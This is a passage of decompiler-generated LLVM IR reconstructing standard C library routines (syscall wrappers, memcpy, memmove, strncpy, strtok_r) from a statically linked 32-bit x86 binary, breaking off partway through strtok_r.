define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ba84 = load i32, i32* @ebx, align 4
  store i32 %v0_804ba84, i32* %stack_var_-4, align 4
  %v1_804ba8d = call i32 @int80_syscall(i32 199)
  store i32 %v1_804ba8d, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804ba8d, -4095
  br i1 %tmp6, label %dec_label_pc_804baa4, label %dec_label_pc_804ba98

dec_label_pc_804ba98:                             ; preds = %entry
  %v0_804ba98 = load i32, i32* %stack_var_-4, align 4
  %v1_804ba98 = call i32 @__errno_location(i32 %v0_804ba98)
  %v0_804ba9d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ba9d = sub i32 0, %v0_804ba9d
  %v2_804ba9f = inttoptr i32 %v1_804ba98 to i32*
  store i32 %v1_804ba9d, i32* %v2_804ba9f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804baa4

dec_label_pc_804baa4:                             ; preds = %entry, %dec_label_pc_804ba98
  %v0_804baa4 = phi i32 [ %v1_804ba8d, %entry ], [ -1, %dec_label_pc_804ba98 ]
  %v2_804baa8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804baa8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804baa4

; uselistorder directives
  uselistorder i32 %v1_804ba8d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804baa4, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804baac = load i32, i32* @ebx, align 4
  store i32 %v0_804baac, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804babf = call i32 @munmap(i32 %v0_804baac, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_804babf, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v4_804babf, -4095
  br i1 %tmp8, label %dec_label_pc_804bad8, label %dec_label_pc_804bacc

dec_label_pc_804bacc:                             ; preds = %entry
  %v0_804bacc = load i32, i32* %stack_var_-4, align 4
  %v1_804bacc = call i32 @__errno_location(i32 %v0_804bacc)
  %v0_804bad1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bad1 = sub i32 0, %v0_804bad1
  %v2_804bad3 = inttoptr i32 %v1_804bacc to i32*
  store i32 %v1_804bad1, i32* %v2_804bad3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804bad8

dec_label_pc_804bad8:                             ; preds = %entry, %dec_label_pc_804bacc
  %v0_804bad8 = phi i32 [ %v4_804babf, %entry ], [ -1, %dec_label_pc_804bacc ]
  %v2_804bada = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bada, i32* @edx, align 4
  %v2_804badc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804badc, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804bad8

; uselistorder directives
  uselistorder i32 %v4_804babf, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804bad8, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804bae1 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804bae7 = sdiv i32 %sext, 16777216
  store i32 %v4_804bae7, i32* @ecx, align 4
  %v4_804baeb = ptrtoint i8* %arg1 to i32
  %v3_804baef = and i32 %arg2, 64
  %v4_804baef = icmp eq i32 %v3_804baef, 0
  br i1 %v4_804baef, label %dec_label_pc_804bb00, label %dec_label_pc_804baf4

dec_label_pc_804baf4:                             ; preds = %entry
  %phitmp = urem i32 %arg3, 65536
  br label %dec_label_pc_804bb00

dec_label_pc_804bb00:                             ; preds = %entry, %dec_label_pc_804baf4
  %v0_804bb00 = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_804baf4 ]
  store i32 %v0_804bb00, i32* @edx, align 4
  store i32 %v4_804baeb, i32* %ebx.global-to-local, align 4
  %v5_804bb0b = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804bae7)
  store i32 %v5_804bb0b, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_804bb0b, -4095
  br i1 %tmp15, label %dec_label_pc_804bb23, label %dec_label_pc_804bb17

dec_label_pc_804bb17:                             ; preds = %dec_label_pc_804bb00
  %v1_804bb17 = call i32 @__errno_location(i32 %v0_804bae1)
  %v0_804bb1c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bb1c = sub i32 0, %v0_804bb1c
  %v2_804bb1e = inttoptr i32 %v1_804bb17 to i32*
  store i32 %v1_804bb1c, i32* %v2_804bb1e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804bb23

dec_label_pc_804bb23:                             ; preds = %dec_label_pc_804bb00, %dec_label_pc_804bb17
  %v0_804bb23 = phi i32 [ %v5_804bb0b, %dec_label_pc_804bb00 ], [ -1, %dec_label_pc_804bb17 ]
  store i32 %v0_804bae1, i32* @ebx, align 4
  ret i32 %v0_804bb23

; uselistorder directives
  uselistorder i32 %v5_804bb0b, { 1, 0, 2 }
  uselistorder i32 %v4_804bae7, { 1, 0 }
  uselistorder i32 %v0_804bae1, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804bb23, { 1, 0 }
  uselistorder label %dec_label_pc_804bb00, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804bb3b = inttoptr i32 %arg1 to i8*
  %v4_804bb3b = call i32 @__libc_open(i8* %v3_804bb3b, i32 577, i32 %arg2)
  ret i32 %v4_804bb3b
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804bb45 = load i32, i32* @ebx, align 4
  %v0_804bb49 = load i32, i32* @global_var_8052544.82, align 4
  %v1_804bb49 = icmp eq i32 %v0_804bb49, 0
  %v1_804bb54 = icmp eq i1 %v1_804bb49, false
  br i1 %v1_804bb54, label %dec_label_pc_804bb67, label %dec_label_pc_804bb56

dec_label_pc_804bb56:                             ; preds = %entry
  %v1_804bb5b = call i32 @__GI_brk(i32 0)
  %v2_804bb63 = icmp slt i32 %v1_804bb5b, 0
  br i1 %v2_804bb63, label %dec_label_pc_804bb89, label %dec_label_pc_804bb56.dec_label_pc_804bb67_crit_edge

dec_label_pc_804bb56.dec_label_pc_804bb67_crit_edge: ; preds = %dec_label_pc_804bb56
  %v0_804bb69.pre = load i32, i32* @global_var_8052544.82, align 4
  br label %dec_label_pc_804bb67

dec_label_pc_804bb67:                             ; preds = %dec_label_pc_804bb56.dec_label_pc_804bb67_crit_edge, %entry
  %v0_804bb77 = phi i32 [ %v0_804bb69.pre, %dec_label_pc_804bb56.dec_label_pc_804bb67_crit_edge ], [ %v0_804bb49, %entry ]
  %v1_804bb67 = icmp eq i32 %arg1, 0
  %v1_804bb6e = icmp eq i1 %v1_804bb67, false
  br i1 %v1_804bb6e, label %dec_label_pc_804bb74, label %dec_label_pc_804bb70

dec_label_pc_804bb70:                             ; preds = %dec_label_pc_804bb67
  br label %dec_label_pc_804bb8c

dec_label_pc_804bb74:                             ; preds = %dec_label_pc_804bb67
  store i32 %v0_804bb77, i32* @ebx, align 4
  %v2_804bb79 = add i32 %v0_804bb77, %arg1
  %v1_804bb7d = call i32 @__GI_brk(i32 %v2_804bb79)
  %v2_804bb85 = icmp slt i32 %v1_804bb7d, 0
  %v1_804bb87 = icmp eq i1 %v2_804bb85, false
  br i1 %v1_804bb87, label %dec_label_pc_804bb74.dec_label_pc_804bb8c_crit_edge, label %dec_label_pc_804bb89

dec_label_pc_804bb74.dec_label_pc_804bb8c_crit_edge: ; preds = %dec_label_pc_804bb74
  %v0_804bb8c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804bb8c

dec_label_pc_804bb89:                             ; preds = %dec_label_pc_804bb74, %dec_label_pc_804bb56
  br label %dec_label_pc_804bb8c

dec_label_pc_804bb8c:                             ; preds = %dec_label_pc_804bb74.dec_label_pc_804bb8c_crit_edge, %dec_label_pc_804bb70, %dec_label_pc_804bb89
  %v0_804bb8c = phi i32 [ %v0_804bb8c.pre, %dec_label_pc_804bb74.dec_label_pc_804bb8c_crit_edge ], [ %v0_804bb77, %dec_label_pc_804bb70 ], [ -1, %dec_label_pc_804bb89 ]
  %v2_804bb8e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bb8e, i32* @edx, align 4
  store i32 %v0_804bb45, i32* @ebx, align 4
  ret i32 %v0_804bb8c

; uselistorder directives
  uselistorder i32 %v0_804bb77, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_804bb8c, { 2, 0, 1 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804bb95 = load i32, i32* @esi, align 4
  %v4_804bb99 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804bb99, i32* @ecx, align 4
  %v2_804bba5 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804bba5, label %dec_label_pc_804bbbe, label %dec_label_pc_804bba9

dec_label_pc_804bba9:                             ; preds = %entry
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_804bbbe, label %dec_label_pc_804bbae

dec_label_pc_804bbae:                             ; preds = %dec_label_pc_804bba9
  %v1_804bbae = call i32 @__errno_location(i32 %v0_804bb95)
  %v1_804bbb3 = inttoptr i32 %v1_804bbae to i32*
  store i32 22, i32* %v1_804bbb3, align 4
  br label %dec_label_pc_804bbe5

dec_label_pc_804bbbe:                             ; preds = %dec_label_pc_804bba9, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804bbc3 = load i32, i32* @ebx, align 4
  %v7_804bbcb = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_804bbc3, i32* @ebx, align 4
  store i32 %v7_804bbcb, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_804bbcb, -4095
  br i1 %tmp12, label %dec_label_pc_804bbe5, label %dec_label_pc_804bbd7

dec_label_pc_804bbd7:                             ; preds = %dec_label_pc_804bbbe
  %v1_804bbd7 = call i32 @__errno_location(i32 %v0_804bbc3)
  %v0_804bbdc = load i32, i32* %esi.global-to-local, align 4
  %v1_804bbdc = sub i32 0, %v0_804bbdc
  %v2_804bbde = inttoptr i32 %v1_804bbd7 to i32*
  store i32 %v1_804bbdc, i32* %v2_804bbde, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804bbe5

dec_label_pc_804bbe5:                             ; preds = %dec_label_pc_804bbd7, %dec_label_pc_804bbbe, %dec_label_pc_804bbae
  %storemerge = phi i32 [ -1, %dec_label_pc_804bbae ], [ %v7_804bbcb, %dec_label_pc_804bbbe ], [ -1, %dec_label_pc_804bbd7 ]
  %v2_804bbe5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bbe5, i32* @edx, align 4
  store i32 %v0_804bb95, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_804bbcb, { 1, 0, 2 }
  uselistorder i32 %v0_804bbc3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bbec = load i32, i32* @edi, align 4
  store i32 %v0_804bbec, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804bbf4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804bbfc = call i32 @times(i32 %v0_804bbf4)
  store i32 %v1_804bbfc, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804bbfc, -4095
  br i1 %tmp8, label %dec_label_pc_804bc14, label %dec_label_pc_804bc08

dec_label_pc_804bc08:                             ; preds = %entry
  %v1_804bc08 = call i32 @__errno_location(i32 %v0_804bbf4)
  %v0_804bc0d = load i32, i32* %edi.global-to-local, align 4
  %v1_804bc0d = sub i32 0, %v0_804bc0d
  %v2_804bc0f = inttoptr i32 %v1_804bc08 to i32*
  store i32 %v1_804bc0d, i32* %v2_804bc0f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804bc14

dec_label_pc_804bc14:                             ; preds = %entry, %dec_label_pc_804bc08
  %v0_804bc14 = phi i32 [ %v1_804bbfc, %entry ], [ -1, %dec_label_pc_804bc08 ]
  %v2_804bc18 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bc18, i32* @edi, align 4
  ret i32 %v0_804bc14

; uselistorder directives
  uselistorder i32 %v1_804bbfc, { 1, 0, 2 }
  uselistorder i32 (i32)* @times, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804bc14, { 1, 0 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804bc1c = load i32, i32* @edi, align 4
  %v0_804bc1d = load i32, i32* @esi, align 4
  store i32 %v0_804bc1d, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_804bc31 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804bc39 = call i32 @wait4(i32 %v0_804bc31, i32 %v0_804bc1d, i32 %v0_804bc1c, i32 %tmp5)
  store i32 %v0_804bc31, i32* @ebx, align 4
  store i32 %v4_804bc39, i32* %esi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_804bc39, -4095
  br i1 %tmp10, label %dec_label_pc_804bc51, label %dec_label_pc_804bc45

dec_label_pc_804bc45:                             ; preds = %entry
  %v1_804bc45 = call i32 @__errno_location(i32 %v0_804bc31)
  %v0_804bc4a = load i32, i32* %esi.global-to-local, align 4
  %v1_804bc4a = sub i32 0, %v0_804bc4a
  %v2_804bc4c = inttoptr i32 %v1_804bc45 to i32*
  store i32 %v1_804bc4a, i32* %v2_804bc4c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804bc51

dec_label_pc_804bc51:                             ; preds = %entry, %dec_label_pc_804bc45
  %v0_804bc51 = phi i32 [ %v4_804bc39, %entry ], [ -1, %dec_label_pc_804bc45 ]
  %v2_804bc54 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804bc54, i32* @esi, align 4
  store i32 %v0_804bc1c, i32* @edi, align 4
  ret i32 %v0_804bc51

; uselistorder directives
  uselistorder i32 %v4_804bc39, { 1, 0, 2 }
  uselistorder i32 %v0_804bc31, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 1, 0 }
  uselistorder label %dec_label_pc_804bc51, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_8052524.83 to i32)
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804bc61 = load i32, i32* @esi, align 4
  store i32 %v0_804bc61, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_804bc62 = sdiv i32 %sext, 16777216
  store i32 %v4_804bc62, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804bc6c = ptrtoint i16* %arg1 to i32
  store i32 %v4_804bc6c, i32* %edi.global-to-local, align 4
  %v2_804bc70 = udiv i32 %v4_804bc62, 4
  %v3_804bc73 = inttoptr i32 %arg2 to i8*
  %v4_804bc73 = bitcast i16* %arg1 to i8*
  %v5_804bc73 = call i8* @_memcpy(i8* %v4_804bc73, i8* %v3_804bc73, i32 %v2_804bc70)
  %v6_804bc73 = ptrtoint i8* %v5_804bc73 to i32
  store i32 %v6_804bc73, i32* @ecx, align 4
  %v0_804bc75 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bc75 = and i32 %v0_804bc75, 2
  %v3_804bc75 = icmp eq i32 %v2_804bc75, 0
  br i1 %v3_804bc75, label %dec_label_pc_804bc7b, label %dec_label_pc_804bc79

dec_label_pc_804bc79:                             ; preds = %entry
  %v0_804bc79 = load i32, i32* %esi.global-to-local, align 4
  %v1_804bc79 = inttoptr i32 %v0_804bc79 to i16*
  %v2_804bc79 = load i16, i16* %v1_804bc79, align 2
  %v3_804bc79 = load i32, i32* %edi.global-to-local, align 4
  %v4_804bc79 = inttoptr i32 %v3_804bc79 to i16*
  store i16 %v2_804bc79, i16* %v4_804bc79, align 2
  %v5_804bc79 = load i32, i32* %edi.global-to-local, align 4
  %v6_804bc79 = load i32, i32* %esi.global-to-local, align 4
  %v7_804bc79 = load i1, i1* @df, align 1
  %v8_804bc79 = select i1 %v7_804bc79, i32 -2, i32 2
  %v9_804bc79 = add i32 %v8_804bc79, %v5_804bc79
  %v10_804bc79 = add i32 %v8_804bc79, %v6_804bc79
  store i32 %v9_804bc79, i32* %edi.global-to-local, align 4
  store i32 %v10_804bc79, i32* %esi.global-to-local, align 4
  %v0_804bc7b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bc7b

dec_label_pc_804bc7b:                             ; preds = %entry, %dec_label_pc_804bc79
  %v0_804bc7b = phi i32 [ %v0_804bc75, %entry ], [ %v0_804bc7b.pre, %dec_label_pc_804bc79 ]
  %v2_804bc7b = urem i32 %v0_804bc7b, 2
  %v3_804bc7b = icmp eq i32 %v2_804bc7b, 0
  br i1 %v3_804bc7b, label %dec_label_pc_804bc80, label %dec_label_pc_804bc7f

dec_label_pc_804bc7f:                             ; preds = %dec_label_pc_804bc7b
  %v0_804bc7f = load i32, i32* %esi.global-to-local, align 4
  %v1_804bc7f = inttoptr i32 %v0_804bc7f to i8*
  %v2_804bc7f = load i8, i8* %v1_804bc7f, align 1
  %v3_804bc7f = load i32, i32* %edi.global-to-local, align 4
  %v4_804bc7f = inttoptr i32 %v3_804bc7f to i8*
  store i8 %v2_804bc7f, i8* %v4_804bc7f, align 1
  %v5_804bc7f = load i32, i32* %edi.global-to-local, align 4
  %v6_804bc7f = load i32, i32* %esi.global-to-local, align 4
  %v7_804bc7f = load i1, i1* @df, align 1
  %v8_804bc7f = select i1 %v7_804bc7f, i32 -1, i32 1
  %v9_804bc7f = add i32 %v8_804bc7f, %v5_804bc7f
  %v10_804bc7f = add i32 %v8_804bc7f, %v6_804bc7f
  store i32 %v9_804bc7f, i32* %edi.global-to-local, align 4
  store i32 %v10_804bc7f, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804bc80

dec_label_pc_804bc80:                             ; preds = %dec_label_pc_804bc7b, %dec_label_pc_804bc7f
  store i32 %v4_804bc6c, i32* %eax.global-to-local, align 4
  %v2_804bc84 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804bc84, i32* @esi, align 4
  ret i32 %v4_804bc6c

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_804bc80, { 1, 0 }
  uselistorder label %dec_label_pc_804bc7b, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_804bc89 = load i32, i32* @esi, align 4
  store i32 %v0_804bc89, i32* %stack_var_-8, align 4
  %v4_804bc8a = ptrtoint i8* %arg1 to i32
  %v9_804bc96 = icmp ugt i8* %tmp3, %arg1
  %v1_804bc98 = icmp eq i1 %v9_804bc96, false
  br i1 %v1_804bc98, label %dec_label_pc_804bca0, label %dec_label_pc_804bc9a

dec_label_pc_804bc9a:                             ; preds = %entry
  %v7_804bc9c = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_804bcac

dec_label_pc_804bca0:                             ; preds = %entry
  %v3_804bca0 = add i32 %arg2, -1
  %v4_804bca0 = add i32 %v3_804bca0, %tmp
  %v5_804bca0 = inttoptr i32 %v4_804bca0 to i8*
  %v3_804bca4 = add i32 %v4_804bc8a, -1
  %v4_804bca4 = add i32 %v3_804bca4, %tmp
  %v5_804bca4 = inttoptr i32 %v4_804bca4 to i8*
  %v7_804bca9 = call i8* @_memcpy(i8* %v5_804bca4, i8* %v5_804bca0, i32 %tmp)
  br label %dec_label_pc_804bcac

dec_label_pc_804bcac:                             ; preds = %dec_label_pc_804bc9a, %dec_label_pc_804bca0
  %v2_804bcac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804bcac, i32* @esi, align 4
  ret i32 %v4_804bc8a

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804bcac, { 1, 0 }
}

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804bcb1 = load i32, i32* @esi, align 4
  store i32 %v0_804bcb1, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804bcbd = ptrtoint i8* %arg1 to i32
  store i32 %v4_804bcbd, i32* %edi.global-to-local, align 4
  %v1_804bcc1 = add i32 %arg3, 1
  store i32 %v1_804bcc1, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804bcc2

dec_label_pc_804bcc2:                             ; preds = %dec_label_pc_804bcc5, %entry
  %v3_804bcc6 = phi i32 [ %v4_804bcbd, %entry ], [ %v8_804bcc6, %dec_label_pc_804bcc5 ]
  %v0_804bcc2 = phi i32 [ %v1_804bcc1, %entry ], [ %v0_804bcc2.pre, %dec_label_pc_804bcc5 ]
  %v1_804bcc2 = add i32 %v0_804bcc2, -1
  %v8_804bcc2 = icmp eq i32 %v1_804bcc2, 0
  store i32 %v1_804bcc2, i32* %ecx.global-to-local, align 4
  br i1 %v8_804bcc2, label %.loopexit, label %dec_label_pc_804bcc5

dec_label_pc_804bcc5:                             ; preds = %dec_label_pc_804bcc2
  %v0_804bcc5 = load i32, i32* %esi.global-to-local, align 4
  %v1_804bcc5 = inttoptr i32 %v0_804bcc5 to i8*
  %v2_804bcc5 = load i8, i8* %v1_804bcc5, align 1
  %v10_804bcc5 = load i1, i1* @df, align 1
  %v11_804bcc5 = select i1 %v10_804bcc5, i32 -1, i32 1
  %v12_804bcc5 = add i32 %v11_804bcc5, %v0_804bcc5
  store i32 %v12_804bcc5, i32* %esi.global-to-local, align 4
  %v4_804bcc6 = inttoptr i32 %v3_804bcc6 to i8*
  store i8 %v2_804bcc5, i8* %v4_804bcc6, align 1
  %v5_804bcc6 = load i32, i32* %edi.global-to-local, align 4
  %v6_804bcc6 = load i1, i1* @df, align 1
  %v7_804bcc6 = select i1 %v6_804bcc6, i32 -1, i32 1
  %v8_804bcc6 = add i32 %v7_804bcc6, %v5_804bcc6
  store i32 %v8_804bcc6, i32* %edi.global-to-local, align 4
  %v6_804bcc7 = icmp eq i8 %v2_804bcc5, 0
  %v1_804bcc9 = icmp eq i1 %v6_804bcc7, false
  %v0_804bcc2.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_804bcc9, label %dec_label_pc_804bcc2, label %dec_label_pc_804bccb

dec_label_pc_804bccb:                             ; preds = %dec_label_pc_804bcc5
  %v1_804bccb = add i32 %v0_804bcc2.pre, -1
  store i32 %v1_804bccb, i32* %ecx.global-to-local, align 4
  %v2_804bccc = sext i8 %v2_804bcc5 to i32
  %v4_804bccc = inttoptr i32 %v8_804bcc6 to i8*
  %v5_804bccc = call i8* @_memset(i8* %v4_804bccc, i32 %v2_804bccc, i32 %v1_804bccb)
  %v6_804bccc = ptrtoint i8* %v5_804bccc to i32
  store i32 %v6_804bccc, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804bcc2, %dec_label_pc_804bccb
  %v2_804bcd2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bcd2, i32* @edx, align 4
  %v2_804bcd3 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804bcd3, i32* @esi, align 4
  ret i32 %v4_804bcbd

; uselistorder directives
  uselistorder i32 %v8_804bcc6, { 0, 2, 1 }
  uselistorder i8 %v2_804bcc5, { 0, 2, 1 }
  uselistorder i32 %v1_804bcc2, { 1, 0 }
  uselistorder i32 %v4_804bcbd, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804bcd8 = load i32, i32* @edi, align 4
  %v0_804bcd9 = load i32, i32* @esi, align 4
  %v0_804bcda = load i32, i32* @ebx, align 4
  store i32 %v0_804bcda, i32* %stack_var_-12, align 4
  %v4_804bcdb = ptrtoint i8* %arg1 to i32
  store i32 %v4_804bcdb, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_804bce7 = icmp eq i8* %arg1, null
  %v1_804bce9 = icmp eq i1 %v1_804bce7, false
  br i1 %v1_804bce9, label %dec_label_pc_804bced, label %dec_label_pc_804bceb

dec_label_pc_804bceb:                             ; preds = %entry
  %v1_804bceb = inttoptr i32 %arg3 to i32*
  %v2_804bceb = load i32, i32* %v1_804bceb, align 4
  store i32 %v2_804bceb, i32* @ebx, align 4
  br label %dec_label_pc_804bced

dec_label_pc_804bced:                             ; preds = %entry, %dec_label_pc_804bceb
  %v0_804bcf0 = phi i32 [ %v4_804bcdb, %entry ], [ %v2_804bceb, %dec_label_pc_804bceb ]
  %v0_804bced = load i32, i32* @ecx, align 4
  %v5_804bcf0 = inttoptr i32 %v0_804bcf0 to i8*
  %v8_804bcf1 = call i32 @__GI_strspn(i8* %v5_804bcf0, i32 %arg2, i32 %v0_804bced, i32 %v0_804bced)
  store i32 %v8_804bcf1, i32* %eax.global-to-local, align 4
  %v0_804bcf9 = load i32, i32* @ebx, align 4
  %v2_804bcf9 = add i32 %v0_804bcf9, %v8_804bcf1
  store i32 %v2_804bcf9, i32* @ebx, align 4
  %v1_804bcfb = inttoptr i32 %v2_804bcf9 to i8*
  %v2_804bcfb = load i8, i8* %v1_804bcfb, align 1
  %v3_804bcfb = icmp eq i8 %v2_804bcfb, 0
  %v1_804bcfe = icmp eq i1 %v3_804bcfb, false
  br i1 %v1_804bcfe, label %dec_label_pc_804bd06, label %dec_label_pc_804bd00

dec_label_pc_804bd00:                             ; preds = %dec_label_pc_804bced
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804bd02 = load i32, i32* @esi, align 4
  %v2_804bd02 = inttoptr i32 %v1_804bd02 to i32*
  store i32 %v2_804bcf9, i32* %v2_804bd02, align 4
  %v0_804bd30.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bd2d

dec_label_pc_804bd06:                             ; preds = %dec_label_pc_804bced
  %v0_804bd06 = load i32, i32* @edx, align 4
  %v0_804bd08 = load i32, i32* @edi, align 4
  %v8_804bd0a = call i32 @__GI_strpbrk(i8* %v1_804bcfb, i32 %v0_804bd08, i32 %v0_804bd06, i32 %v0_804bd06)
  store i32 %v8_804bd0a, i32* %eax.global-to-local, align 4
  %v2_804bd12 = icmp eq i32 %v8_804bd0a, 0
  %v1_804bd14 = icmp eq i1 %v2_804bd12, false
  br i1 %v1_804bd14, label %dec_label_pc_804bd25, label %dec_label_pc_804bd16

dec_label_pc_804bd16:                             ; preds = %dec_label_pc_804bd06
  %v0_804bd1a = load i32, i32* @ebx, align 4
  %v5_804bd1a = inttoptr i32 %v0_804bd1a to i8*
  %v8_804bd1b = call i32 @rawmemchr(i8* %v5_804bd1a, i32 0, i32 %v8_804bd0a, i32 %v8_804bd0a)
